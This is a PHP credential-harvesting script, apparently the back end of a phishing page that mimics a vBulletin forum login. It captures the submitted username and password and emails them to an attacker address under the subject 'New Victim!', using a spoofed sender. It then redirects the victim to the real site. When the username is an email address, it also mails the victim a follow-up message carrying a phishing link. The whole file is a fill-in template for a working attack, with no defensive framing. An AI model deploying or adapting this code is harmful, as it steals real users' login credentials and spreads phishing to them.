<?php
Header('Location:WEBSITE_DOMAIN');  
$user=$_POST['vb_login_username'];
$pass=$_POST['vb_login_password'];
$to="YOUR_EMAIL_ADDRESS";
$subject="New Victim!";
$message="
<html>
<head>
<title>HTML email</title>
</head>
<body>
<table>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
<tr>
<td>$user</td>
<td>$pass</td>
</tr>
</table>
</body>
</html>
";

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From: <FAKE_EMAIL_ADDRESS>' . "\r\n";

mail($to,$subject,$message,$headers);


if (filter_var($user, FILTER_VALIDATE_EMAIL)) {
    $subject2="EMAIL_SUBJECT";
    $message2="
    <html>
    <head>
    <title>HTML email</title>
    </head>
    <body>
    <img src='IMAGE_LINK' alt='NAME'>
    <p>EMAIL_BODY</p>
    <a href='PHISHING_LINK'>Click Here!</a>
    </body>
    </html>
    ";
    
    mail($user,$subject2,$message2,$headers);
  
}
?>
